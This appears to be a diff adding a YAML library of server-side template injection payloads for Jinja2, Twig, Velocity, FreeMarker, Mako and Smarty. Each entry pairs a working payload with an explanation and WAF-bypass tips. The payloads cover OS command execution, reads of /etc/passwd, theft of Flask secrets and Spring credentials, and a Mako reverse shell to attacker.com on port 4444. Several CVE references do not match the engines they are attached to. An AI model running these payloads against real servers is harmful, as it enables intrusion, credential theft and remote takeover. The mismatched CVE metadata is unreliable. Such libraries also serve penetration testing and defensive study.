@@ -1,0 +1,801 @@
+slug: ssti
+name: Server-Side Template Injection (SSTI)
+owasp: A03:2021 – Injection
+description: 'SSTI occurs when user input is embedded into a server-side template expression and evaluated by the template
+  engine. Unlike XSS which executes in the browser, SSTI executes on the server with the web application''s OS privileges.
+  Successful exploitation typically leads to remote code execution, allowing the attacker to read files, execute commands,
+  and establish persistence on the server.
+
+  '
+severity_range:
+  low: CVSS 7.3
+  high: CVSS 9.8
+references:
+- label: OWASP A03:2021 – Injection (template injection falls under injection category)
+  url: https://owasp.org/Top10/A03_2021-Injection/
+- label: PortSwigger SSTI Research
+  url: https://portswigger.net/web-security/server-side-template-injection
+- label: James Kettle SSTI Research
+  url: https://portswigger.net/kb/papers/serversidetemplateinjection-portswigger.pdf
+groups:
+- slug: jinja2
+  name: Jinja2 (Python)
+  description: SSTI payloads for Jinja2 template engine used in Flask, Django (via Jinja2 loader), and Ansible.
+  difficulty: medium
+  prerequisites:
+  - Application uses Jinja2 template engine
+  - User input rendered in template expression {{ }}
+  payloads:
+  - id: ssti-j2-001
+    title: Jinja2 expression probe
+    payload_string: '{{7*7}}'
+    how_it_works: 'The double-brace syntax is the Jinja2 expression delimiter. If user input is directly embedded in a Jinja2
+      template (e.g., render_template_string(user_input)), the expression {{7*7}} evaluates to 49. If the response contains
+      ''49'' rather than ''{{7*7}}'', SSTI is confirmed. This distinguishes Jinja2 from Twig (which uses the same syntax)
+      and from contexts where the braces are rendered literally. It is the universal first-step probe for Python template
+      injection.
+
+      '
+    prerequisites:
+    - Input rendered in Jinja2 template
+    waf_bypass_notes: Simple arithmetic; hard to block without breaking templates
+    severity_context: CVSS 9.8 – confirms SSTI for RCE escalation
+    cve_refs:
+    - CVE-2022-22963
+    tags:
+    - ssti
+    - jinja2
+    - probe
+    - expression
+    - python
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-j2-002
+    title: Jinja2 RCE via subclasses
+    payload_string: '{{''''.__class__.__mro__[1].__subclasses__()[407](''id'',shell=True,stdout=-1).communicate()[0].strip()}}'
+    how_it_works: 'Jinja2 executes Python, providing access to the Python object model. By traversing the MRO (Method Resolution
+      Order) and iterating __subclasses__(), the attacker locates the subprocess.Popen class. The index (407) varies by Python
+      version and loaded modules. Once Popen is accessed, arbitrary OS commands execute. The ''id'' command is replaced with
+      any shell command. This is the standard Jinja2-to-RCE technique requiring only access to Python''s object hierarchy.
+
+      '
+    prerequisites:
+    - Jinja2 SSTI confirmed
+    - No sandbox restricting __class__ and __subclasses__
+    waf_bypass_notes: Index 407 varies; iterate __subclasses__() to find subprocess.Popen
+    severity_context: CVSS 9.8 – OS command execution via Jinja2 Python object traversal
+    cve_refs:
+    - CVE-2022-22947
+    tags:
+    - ssti
+    - jinja2
+    - rce
+    - subclasses
+    - popen
+    - python
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-j2-003
+    title: Jinja2 config object access
+    payload_string: '{{config}}'
+    how_it_works: 'In Flask applications, the Jinja2 template context includes the Flask config object by default. The config
+      object contains the application''s configuration dictionary, including SECRET_KEY (used to sign session cookies), database
+      URIs, API keys, and any other configuration set by the developer. Reading SECRET_KEY allows forging Flask session cookies
+      to impersonate any user including admins. This does not require RCE and is a high-value information disclosure payload.
+
+      '
+    prerequisites:
+    - Flask application with Jinja2 SSTI
+    - config object in template context (Flask default)
+    waf_bypass_notes: config is a built-in Flask template variable; no bypass needed
+    severity_context: CVSS 9.1 – Flask SECRET_KEY disclosure for session cookie forgery
+    cve_refs:
+    - CVE-2023-22527
+    tags:
+    - ssti
+    - jinja2
+    - flask
+    - config
+    - secret-key
+    - session-forgery
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-j2-004
+    title: Jinja2 file read
+    payload_string: '{{''''.__class__.__mro__[1].__subclasses__()[407](''cat /etc/passwd'',shell=True,stdout=-1).communicate()}}'
+    how_it_works: 'The same subprocess.Popen technique used for RCE can read arbitrary files by passing a cat command. The
+      file contents are returned in the template output. This is useful for reading configuration files, SSH keys, and application
+      source code without establishing a reverse shell. The communicate() function returns stdout as bytes, which Jinja2 renders
+      as the output. Encoding the output with decode(''utf-8'') makes it more readable in the response.
+
+      '
+    prerequisites:
+    - Jinja2 SSTI with RCE capability
+    waf_bypass_notes: 'Use open() in Python directly: {{open(''/etc/passwd'').read()}}'
+    severity_context: CVSS 9.8 – arbitrary file read via Jinja2 command execution
+    cve_refs: []
+    tags:
+    - ssti
+    - jinja2
+    - file-read
+    - rce
+    - data-exfil
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-j2-005
+    title: Jinja2 sandbox escape via lipsum
+    payload_string: '{{lipsum.__globals__[''os''].popen(''id'').read()}}'
+    how_it_works: 'Jinja2''s built-in lipsum function (lorem ipsum generator) has a __globals__ attribute accessible in the
+      template context. The __globals__ dictionary contains all globally imported modules. If ''os'' is imported in the application,
+      it appears in lipsum.__globals__ and os.popen() can execute commands directly. This is a cleaner RCE method than the
+      subclasses approach and requires no index guessing. The lipsum function is always available in Jinja2 environments.
+
+      '
+    prerequisites:
+    - Jinja2 SSTI
+    - '''os'' module imported in the application context'
+    waf_bypass_notes: lipsum is a Jinja2 built-in; more stable than subclasses index
+    severity_context: CVSS 9.8 – RCE via Jinja2 lipsum globals access to os.popen
+    cve_refs: []
+    tags:
+    - ssti
+    - jinja2
+    - lipsum
+    - globals
+    - os-popen
+    - rce
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: twig
+  name: Twig (PHP)
+  description: SSTI payloads for the Twig template engine used in Symfony and other PHP frameworks.
+  difficulty: medium
+  prerequisites:
+  - Application uses Twig template engine
+  - User input rendered in Twig expression {{ }}
+  payloads:
+  - id: ssti-twig-001
+    title: Twig expression probe
+    payload_string: '{{7*''7''}}'
+    how_it_works: 'Twig uses the same double-brace syntax as Jinja2. The expression {{7*''7''}} evaluates to ''49'' in Jinja2
+      but ''7777777'' in Twig due to their different type coercion behaviors. This difference is the key distinguisher between
+      Jinja2 and Twig injection. If the response contains ''7777777'', the template engine is Twig (PHP). This distinction
+      matters because Twig and Jinja2 have different exploitation techniques. Confirming the engine type guides the choice
+      of subsequent RCE payloads.
+
+      '
+    prerequisites:
+    - Input rendered in Twig template
+    waf_bypass_notes: Arithmetic probe; response '7777777' = Twig; '49' = Jinja2
+    severity_context: CVSS 9.8 – Twig SSTI confirmation distinguishing from Jinja2
+    cve_refs:
+    - CVE-2018-7600
+    tags:
+    - ssti
+    - twig
+    - probe
+    - php
+    - engine-detection
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-twig-002
+    title: Twig RCE via filter
+    payload_string: '{{[''id'']|filter(''system'')}}'
+    how_it_works: 'Twig filters process values through PHP functions. The ''system'' filter calls PHP''s system() function
+      with the string ''id'' as the argument, executing the OS command. This is the most concise Twig RCE payload. Twig''s
+      filter functionality accepts PHP callable names as filter identifiers, and system() is callable in PHP. Replacing ''id''
+      with any command achieves arbitrary code execution. This is significantly shorter than the map/exec alternatives.
+
+      '
+    prerequisites:
+    - Twig SSTI confirmed
+    - PHP system() callable (not disabled in php.ini)
+    waf_bypass_notes: system is blocked? Try exec, passthru, shell_exec as alternatives
+    severity_context: CVSS 9.8 – Twig filter to PHP system() OS command execution
+    cve_refs:
+    - CVE-2018-7600
+    tags:
+    - ssti
+    - twig
+    - rce
+    - system-filter
+    - php
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-twig-003
+    title: Twig _self.env for Symfony
+    payload_string: '{{_self.env.registerUndefinedFilterCallback(''exec'')}}{{_self.env.getFilter(''id'')}}'
+    how_it_works: 'In Symfony Twig environments, _self provides access to the Twig environment object. registerUndefinedFilterCallback()
+      sets a callback for unknown filters. By registering PHP''s exec() as the callback and then calling a filter with the
+      command name as the filter name, the exec() function is called with the command string. This is a Symfony- specific
+      technique that works even in restricted Twig sandbox configurations by abusing the Twig extension registration mechanism.
+
+      '
+    prerequisites:
+    - Symfony application with Twig SSTI
+    - _self variable accessible in template context
+    waf_bypass_notes: Symfony-specific; uses legitimate Twig environment API
+    severity_context: CVSS 9.8 – Symfony Twig SSTI to exec() via environment callback
+    cve_refs:
+    - CVE-2018-7600
+    tags:
+    - ssti
+    - twig
+    - symfony
+    - rce
+    - env-callback
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-twig-004
+    title: Twig attribute/method access
+    payload_string: '{{_self.env.enableDebug()}}{{dump(_self)}}'
+    how_it_works: 'Twig''s dump() function outputs the full content of template variables for debugging. By enabling debug
+      mode via _self.env.enableDebug() and then dumping the _self object, the attacker retrieves the complete Twig environment
+      configuration, all loaded extensions, registered functions/filters, and the template source. This provides detailed
+      reconnaissance for further SSTI exploitation without requiring direct RCE. The dump of environment variables may also
+      reveal database credentials and API keys.
+
+      '
+    prerequisites:
+    - Twig SSTI in Symfony or similar framework
+    - dump() function available (Twig DebugExtension loaded)
+    waf_bypass_notes: Information disclosure before RCE; useful for reconnaissance
+    severity_context: CVSS 7.5 – Twig environment dump for credential and configuration disclosure
+    cve_refs: []
+    tags:
+    - ssti
+    - twig
+    - debug
+    - dump
+    - reconnaissance
+    - info-disclosure
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-twig-005
+    title: Twig block bypass
+    payload_string: '{%- set cmd = ''id'' -%}{%- set output = cmd | map(''exec'') -%}{{output}}'
+    how_it_works: 'Twig''s tag syntax {% %} allows setting variables and using control structures. By setting a variable containing
+      the command string and then using the map filter with exec as the callable, the command executes. The map filter applies
+      a callable to each item in an array, but when the input is a single string, it executes once. The whitespace control
+      modifiers (-) prevent output from the set tags. This multi-step approach may bypass filters that only check for simple
+      {{command}} patterns.
+
+      '
+    prerequisites:
+    - Twig SSTI with {% %} tag support
+    - exec() or similar PHP function not disabled
+    waf_bypass_notes: Multi-step tag approach; may bypass single-expression WAF rules
+    severity_context: CVSS 9.8 – Twig SSTI via multi-step variable/map technique
+    cve_refs: []
+    tags:
+    - ssti
+    - twig
+    - block-tag
+    - map-filter
+    - multi-step
+    - bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: velocity
+  name: Velocity (Java)
+  description: SSTI payloads for Apache Velocity template engine used in Java enterprise applications.
+  difficulty: medium
+  prerequisites:
+  - Application uses Apache Velocity template engine
+  - User input rendered in Velocity template
+  payloads:
+  - id: ssti-vel-001
+    title: Velocity expression probe
+    payload_string: '#set($x=7*7)${x}'
+    how_it_works: 'Apache Velocity uses #set() directives to assign values and ${var} syntax for variable interpolation. The
+      directive sets variable x to the result of 7*7 (which Velocity evaluates as 49), then outputs it. If the response contains
+      ''49'', Velocity SSTI is confirmed. The combination of #set and ${} syntax is unique to Velocity, distinguishing it
+      from other template engines. This is the standard Velocity identification payload used in SSTI fuzzing.
+
+      '
+    prerequisites:
+    - Input rendered in Velocity template
+    waf_bypass_notes: 'Velocity uses # and $ syntax; distinct from Jinja2/Twig'
+    severity_context: CVSS 9.8 – Velocity SSTI confirmation
+    cve_refs: []
+    tags:
+    - ssti
+    - velocity
+    - probe
+    - java
+    - enterprise
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-vel-002
+    title: Velocity RCE via class loader
+    payload_string: '#set($runtime = $class.inspect(''java.lang.Runtime'').type)#set($process = $runtime.exec(''id''))#set($is
+      = $process.getInputStream())#set($reader = $class.inspect(''java.io.InputStreamReader'').type.getDeclaredConstructors()[0].newInstance($is))#set($br
+      = $class.inspect(''java.io.BufferedReader'').type.getDeclaredConstructors()[0].newInstance($reader))${br.readLine()}'
+    how_it_works: 'Velocity can access Java classes through the $class object (when ClassTool is available). The payload accesses
+      java.lang.Runtime''s exec() method to run OS commands, then reads the output via a BufferedReader wrapping the process
+      InputStream. This is the full Java Runtime execution chain. Each step in the chain accesses standard Java API classes
+      via Velocity''s class introspection capabilities. The id command output is returned in the template output.
+
+      '
+    prerequisites:
+    - Velocity with ClassTool or equivalent Java class access
+    - No security manager blocking Runtime.exec()
+    waf_bypass_notes: Complex multi-step; harder to detect than single-expression payloads
+    severity_context: CVSS 9.8 – Java Runtime.exec() via Velocity class introspection
+    cve_refs:
+    - CVE-2019-3396
+    tags:
+    - ssti
+    - velocity
+    - rce
+    - java-runtime
+    - class-loader
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-vel-003
+    title: Velocity math and string operations
+    payload_string: '#set($str = $class.inspect(''java.lang.String'').type)#set($chr = $str.valueOf($class.inspect(''char'').type.cast(99)))${chr}'
+    how_it_works: 'When filters block keywords like ''id'', ''cat'', or ''exec'', character-by-character string construction
+      bypasses keyword matching. Using Java''s char casting and String.valueOf(), the attacker builds command strings one
+      character at a time. This technique avoids any literal occurrence of command keywords in the template payload. While
+      verbose, it is highly effective against WAFs and template sandboxes that use string matching for blocklists.
+
+      '
+    prerequisites:
+    - Velocity SSTI with class access
+    - Command keywords filtered
+    waf_bypass_notes: Character construction bypasses string-based keyword filters
+    severity_context: CVSS 9.8 – Velocity SSTI with keyword filter bypass via char construction
+    cve_refs: []
+    tags:
+    - ssti
+    - velocity
+    - char-construction
+    - filter-bypass
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-vel-004
+    title: Velocity tool access for file read
+    payload_string: '#set($file = $class.inspect(''java.io.File'').type.getDeclaredConstructors()[0].newInstance(''/etc/passwd''))#set($scanner
+      = $class.inspect(''java.util.Scanner'').type.getDeclaredConstructors()[0].newInstance($file))${scanner.useDelimiter(''\A'').next()}'
+    how_it_works: 'Instead of executing OS commands, this Velocity payload reads a file using the Java File and Scanner APIs.
+      java.io.File is instantiated with the target path, and java.util.Scanner with the ''\\A'' delimiter (matches beginning
+      of input) reads the entire file content in one call. This is useful when Runtime.exec() is blocked by a Java security
+      manager but file API access is permitted. It provides a more targeted file read capability.
+
+      '
+    prerequisites:
+    - Velocity with Java class access
+    - File read allowed by security policy
+    waf_bypass_notes: File read alternative when exec() is blocked by SecurityManager
+    severity_context: CVSS 8.5 – arbitrary file read via Velocity Java File API access
+    cve_refs:
+    - CVE-2019-3396
+    tags:
+    - ssti
+    - velocity
+    - file-read
+    - java-file-api
+    - security-manager-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-vel-005
+    title: Velocity context dump
+    payload_string: '#foreach($key in $context.keys)$key = $context.get($key)#end'
+    how_it_works: 'Before attempting RCE, dumping the Velocity context reveals all available objects, variables, and tools
+      configured in the template context. This provides reconnaissance data including available Java objects that can be leveraged
+      for exploitation, database connection objects, user session data, and application configuration. The foreach loop iterates
+      all context keys and outputs their values, giving the attacker a complete map of exploitable context objects.
+
+      '
+    prerequisites:
+    - Velocity SSTI with foreach support
+    - context object accessible
+    waf_bypass_notes: Context dump is reconnaissance; no dangerous keywords in payload
+    severity_context: CVSS 7.5 – Velocity context dump for exploitation reconnaissance
+    cve_refs: []
+    tags:
+    - ssti
+    - velocity
+    - context-dump
+    - reconnaissance
+    - info-disclosure
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: freemarker
+  name: FreeMarker (Java)
+  description: SSTI payloads for Apache FreeMarker template engine commonly used in Java enterprise and Spring applications.
+  difficulty: medium
+  prerequisites:
+  - Application uses FreeMarker template engine
+  - User input rendered in FreeMarker template
+  payloads:
+  - id: ssti-fm-001
+    title: FreeMarker probe
+    payload_string: ${7*7}
+    how_it_works: 'FreeMarker uses ${expression} syntax for variable interpolation. The arithmetic expression 7*7 evaluates
+      to 49. If the response contains ''49'', FreeMarker SSTI is confirmed. This distinguishes from velocity (uses $var syntax)
+      and smarty (uses {$var}). FreeMarker is widely used in Atlassian products (Confluence, JIRA), Spring MVC applications,
+      and Apache Struts. Confirming the template engine type is critical for selecting the correct RCE payload.
+
+      '
+    prerequisites:
+    - Input rendered in FreeMarker template
+    waf_bypass_notes: FreeMarker uses ${} and <#...> syntax; ${7*7} is the universal probe
+    severity_context: CVSS 9.8 – FreeMarker SSTI confirmation
+    cve_refs: []
+    tags:
+    - ssti
+    - freemarker
+    - probe
+    - java
+    - spring
+    - atlassian
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-fm-002
+    title: FreeMarker freemarker.template.utility.Execute
+    payload_string: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+    how_it_works: 'FreeMarker''s ?new() builtin creates new instances of Java classes accessible in the classpath. The freemarker.template.utility.Execute
+      class is included in FreeMarker and implements TemplateMethodModelEx, allowing it to be called as a template function.
+      Its exec() method runs OS commands. The #assign directive creates a template variable bound to the Execute instance.
+      This is the canonical FreeMarker RCE technique and works across all FreeMarker versions that include the Execute utility
+      class.
+
+      '
+    prerequisites:
+    - FreeMarker SSTI
+    - ?new() builtin not restricted
+    - freemarker.template.utility.Execute in classpath
+    waf_bypass_notes: Execute class is in freemarker.jar; always available; restrict ?new() to prevent
+    severity_context: CVSS 9.8 – FreeMarker Execute class for direct OS command execution
+    cve_refs:
+    - CVE-2022-22947
+    tags:
+    - ssti
+    - freemarker
+    - rce
+    - execute-class
+    - new-builtin
+    - critical
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-fm-003
+    title: FreeMarker API directive
+    payload_string: ${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+    how_it_works: 'This condensed FreeMarker payload combines class instantiation and method invocation in a single expression.
+      The class name string is used with ?new() to create an Execute instance, and it is immediately invoked with the command
+      string. The inline form is shorter than the #assign approach and may bypass WAFs that detect multi-line template directives.
+      The output of the cat command appears directly in the template output.
+
+      '
+    prerequisites:
+    - FreeMarker SSTI with ?new() available
+    waf_bypass_notes: Single-line variant; shorter than assign+call pattern
+    severity_context: CVSS 9.8 – condensed FreeMarker file read via Execute
+    cve_refs:
+    - CVE-2022-22947
+    tags:
+    - ssti
+    - freemarker
+    - rce
+    - inline
+    - file-read
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-fm-004
+    title: FreeMarker data model dump
+    payload_string: <#list .data_model as var>${var}=${.data_model[var]?string}</#list>
+    how_it_works: '.data_model in FreeMarker provides access to all variables in the template context. Listing and outputting
+      all data model variables reveals the complete context of the current request, including user session data, database
+      query results, application configuration objects, and framework-injected objects. This provides reconnaissance for identifying
+      exploitable Java objects in the context without requiring immediate RCE. Spring Security''s authentication objects,
+      for example, appear here with credentials.
+
+      '
+    prerequisites:
+    - FreeMarker SSTI with data_model access
+    waf_bypass_notes: Data model dump; no dangerous keywords; useful for reconnaissance
+    severity_context: CVSS 7.5 – FreeMarker data model dump for session and credential exposure
+    cve_refs: []
+    tags:
+    - ssti
+    - freemarker
+    - data-model
+    - reconnaissance
+    - info-disclosure
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-fm-005
+    title: FreeMarker Spring security context access
+    payload_string: ${springMacroRequestContext.webApplicationContext.getBean('userDetailsService').loadUserByUsername('admin')}
+    how_it_works: 'In Spring MVC applications using FreeMarker, springMacroRequestContext provides access to the Spring ApplicationContext.
+      Via getBean(), any Spring-managed bean is accessible, including security services, repositories, and service layers.
+      Calling loadUserByUsername on the UserDetailsService retrieves the admin user''s details object, which typically includes
+      the password hash. This attack leverages Spring''s dependency injection container via the template to access internal
+      application services without OS-level command execution.
+
+      '
+    prerequisites:
+    - Spring MVC application with FreeMarker SSTI
+    - springMacroRequestContext in template context
+    waf_bypass_notes: Spring-specific; accesses internal beans rather than OS commands
+    severity_context: CVSS 9.1 – Spring bean access via FreeMarker for credential extraction
+    cve_refs:
+    - CVE-2022-22963
+    tags:
+    - ssti
+    - freemarker
+    - spring
+    - bean-access
+    - credential-extraction
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: mako
+  name: Mako (Python)
+  description: SSTI payloads for the Mako template engine used in Python web applications and Pyramid framework.
+  difficulty: medium
+  prerequisites:
+  - Application uses Mako template engine
+  - User input rendered in Mako template
+  payloads:
+  - id: ssti-mako-001
+    title: Mako expression probe
+    payload_string: ${7*7}
+    how_it_works: 'Mako uses ${expression} syntax for variable interpolation, similar to FreeMarker. The expression evaluates
+      Python code: 7*7 returns 49. Mako templates allow arbitrary Python expressions within ${} blocks, providing direct access
+      to the Python runtime. If the response contains ''49'', Mako SSTI is confirmed. Mako is used in Reddit''s original codebase,
+      Pyramid framework, and many other Python web applications. Unlike Jinja2, Mako does not implement a sandboxed execution
+      environment.
+
+      '
+    prerequisites:
+    - Input rendered in Mako template
+    waf_bypass_notes: ${} syntax; similar to FreeMarker; response of '49' confirms Mako
+    severity_context: CVSS 9.8 – Mako SSTI confirmation
+    cve_refs: []
+    tags:
+    - ssti
+    - mako
+    - probe
+    - python
+    - pyramid
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-mako-002
+    title: Mako RCE via os module
+    payload_string: ${__import__('os').popen('id').read()}
+    how_it_works: 'Mako executes raw Python code without sandboxing. The __import__(''os'') call imports the os module at
+      runtime, bypassing any module-level import restrictions. os.popen() executes a shell command and returns a file-like
+      object, and read() returns the output as a string. This single-expression payload achieves full OS command execution
+      in Mako. Since Mako has no sandbox, any valid Python code executes with the server process''s privileges.
+
+      '
+    prerequisites:
+    - Mako SSTI confirmed
+    - No Python security restrictions (Mako has no built-in sandbox)
+    waf_bypass_notes: __import__ is less commonly blocked than 'import'; os is a standard library
+    severity_context: CVSS 9.8 – Mako OS command execution via Python os.popen
+    cve_refs: []
+    tags:
+    - ssti
+    - mako
+    - rce
+    - os-popen
+    - python
+    - no-sandbox
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-mako-003
+    title: Mako code block RCE
+    payload_string: '<%
+
+      import subprocess
+
+      result = subprocess.check_output(''id'', shell=True)
+
+      %>
+
+      ${result.decode()}'
+    how_it_works: 'Mako''s <% %> block syntax allows multi-line Python code execution, not just expressions. This multi-line
+      payload imports subprocess and uses check_output() to capture command output. The result (bytes) is decoded to a string
+      and rendered via ${result.decode()}. The block form allows more complex Python operations than single-expression injection,
+      including exception handling, loops, and multi-step operations. It is the equivalent of embedding a Python script directly
+      in the server response.
+
+      '
+    prerequisites:
+    - Mako SSTI with block tag support
+    waf_bypass_notes: Multi-line block; may bypass single-line expression filters
+    severity_context: CVSS 9.8 – Mako multi-line Python block for subprocess execution
+    cve_refs: []
+    tags:
+    - ssti
+    - mako
+    - rce
+    - code-block
+    - subprocess
+    - multi-line
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-mako-004
+    title: Mako reverse shell
+    payload_string: ${__import__('os').system('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"')}
+    how_it_works: 'Using os.system() (which returns the exit code, not output) rather than popen(), this payload executes
+      a bash reverse shell. The command connects back to the attacker''s listener, providing an interactive shell with the
+      web server''s OS user privileges. Unlike popen().read() which waits for the command to complete, os.system() can run
+      background processes. This is the escalation from information disclosure to full interactive server access.
+
+      '
+    prerequisites:
+    - Mako SSTI on Unix/Linux server
+    - bash available and outbound TCP to attacker
+    waf_bypass_notes: os.system vs os.popen; shell=True enables string command parsing
+    severity_context: CVSS 9.8 – Mako SSTI to interactive reverse shell
+    cve_refs: []
+    tags:
+    - ssti
+    - mako
+    - reverse-shell
+    - rce
+    - interactive
+    - unix
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-mako-005
+    title: Mako namespace access
+    payload_string: ${namespace.module.__dict__}
+    how_it_works: 'Mako templates have access to a namespace object that represents the current module''s namespace. Accessing
+      namespace.module.__dict__ reveals all imported modules, global variables, and functions in the current Python module.
+      This reconnaissance technique identifies available modules that can be used for further exploitation without requiring
+      __import__. If database connection objects, authentication modules, or cryptographic keys appear in the namespace, they
+      can be accessed directly.
+
+      '
+    prerequisites:
+    - Mako SSTI
+    - namespace object in template context
+    waf_bypass_notes: Reconnaissance payload; no dangerous keywords
+    severity_context: CVSS 7.5 – Mako namespace dump for exploitation reconnaissance
+    cve_refs: []
+    tags:
+    - ssti
+    - mako
+    - namespace
+    - reconnaissance
+    - module-access
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: smarty
+  name: Smarty (PHP)
+  description: SSTI payloads for the Smarty PHP template engine used in many PHP CMS and e-commerce platforms.
+  difficulty: medium
+  prerequisites:
+  - Application uses Smarty template engine
+  - User input rendered in Smarty template {}
+  payloads:
+  - id: ssti-smarty-001
+    title: Smarty expression probe
+    payload_string: '{$smarty.version}'
+    how_it_works: 'Smarty uses single-brace syntax {$variable} for variable output. The {$smarty.version} expression accesses
+      Smarty''s built-in reserved variable containing the template engine version. If the response contains a Smarty version
+      number (e.g., 3.1.44), SSTI is confirmed on Smarty. This is a low-risk probe that reveals the exact Smarty version,
+      helping the attacker select version-specific exploitation techniques.
+
+      '
+    prerequisites:
+    - Input rendered in Smarty template
+    waf_bypass_notes: '{$smarty} is Smarty-specific; version confirms Smarty presence'
+    severity_context: CVSS 9.8 – Smarty version disclosure confirming SSTI
+    cve_refs: []
+    tags:
+    - ssti
+    - smarty
+    - probe
+    - php
+    - version-disclosure
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-smarty-002
+    title: Smarty RCE via {php} tag
+    payload_string: '{php}echo shell_exec(''id'');{/php}'
+    how_it_works: 'Smarty 2.x supported the {php} tag for inline PHP code execution. If enabled (php_handling = SMARTY_PHP_PASSTHRU
+      or SMARTY_PHP_ALLOW), this allows arbitrary PHP execution. shell_exec() runs the ''id'' command and echo outputs the
+      result. In Smarty 3.x, the {php} tag was deprecated and disabled by default, but older applications or those with security_policy->php_functions_enabled
+      may still support it. This is a classic Smarty SSTI-to-RCE technique in legacy applications.
+
+      '
+    prerequisites:
+    - Smarty 2.x or Smarty 3.x with php_functions_enabled
+    - '{php} tag enabled in Smarty configuration'
+    waf_bypass_notes: Smarty 3+ disables {php} by default; target Smarty 2.x installations
+    severity_context: CVSS 9.8 – Smarty {php} tag for direct PHP code execution
+    cve_refs: []
+    tags:
+    - ssti
+    - smarty
+    - php-tag
+    - rce
+    - legacy
+    - php
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-smarty-003
+    title: Smarty getStreamVariable sandbox escape
+    payload_string: '{self::getStreamVariable(''file:///etc/passwd'')}'
+    how_it_works: 'Smarty''s getStreamVariable() method (accessible via {self::}) reads a stream URL. Using the file:// scheme,
+      this provides arbitrary file read capability. This was a documented CVE (CVE-2021-26120) in Smarty that allowed sandbox
+      escape for local file read. Even when Smarty security sandbox is enabled, the getStreamVariable method could be called
+      via static method syntax. This affects Smarty versions before the patched releases and is applicable to any application
+      using vulnerable Smarty versions.
+
+      '
+    prerequisites:
+    - Smarty version with unpatched getStreamVariable
+    - Static method call syntax enabled
+    waf_bypass_notes: Version-specific; check Smarty version; patch available
+    severity_context: CVSS 7.5 – Smarty sandbox escape for local file read
+    cve_refs:
+    - CVE-2021-26120
+    tags:
+    - ssti
+    - smarty
+    - sandbox-escape
+    - file-read
+    - cve
+    - legacy
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-smarty-004
+    title: Smarty math function OS injection
+    payload_string: '{math equation=''x'' format=''%s'' x=''`id`''}'
+    how_it_works: 'Smarty''s {math} function plugin processes mathematical expressions. In older versions, the parameters
+      were passed to PHP''s eval() after interpolation. Embedding backtick command substitution within a Smarty math parameter
+      causes command execution at the PHP level. This is a Smarty plugin-specific RCE technique. The backtick-enclosed ''id''
+      command executes in the PHP shell context. This technique works in Smarty versions where math plugin parameters are
+      not sanitized before evaluation.
+
+      '
+    prerequisites:
+    - Smarty with vulnerable math plugin
+    - Older Smarty versions (pre-3.1.45 security fixes)
+    waf_bypass_notes: Math plugin injection; less common signature in WAF rules
+    severity_context: CVSS 9.8 – Smarty math plugin for backtick command execution
+    cve_refs:
+    - CVE-2021-26120
+    tags:
+    - ssti
+    - smarty
+    - math-plugin
+    - backtick
+    - rce
+    - eval
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: ssti-smarty-005
+    title: Smarty template injection via fetch
+    payload_string: '{fetch file=''/etc/passwd''}'
+    how_it_works: 'Smarty''s {fetch} tag reads and outputs a file or URL. When used with a local file path, it reads arbitrary
+      files from the server filesystem. {fetch file=''/etc/passwd''} reads the passwd file and outputs its content directly
+      in the template. This requires that {fetch} is enabled in Smarty''s security settings (it is enabled by default in unsecured
+      configurations). This is a file read without code execution but provides the same credential theft capability.
+
+      '
+    prerequisites:
+    - Smarty with {fetch} function enabled
+    - Security sandbox not restricting file access
+    waf_bypass_notes: '{fetch} may be less controlled than {php}; test in target application'
+    severity_context: CVSS 7.5 – Smarty {fetch} for arbitrary file read
+    cve_refs:
+    - CVE-2021-26120
+    tags:
+    - ssti
+    - smarty
+    - fetch-tag
+    - file-read
+    - no-rce
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
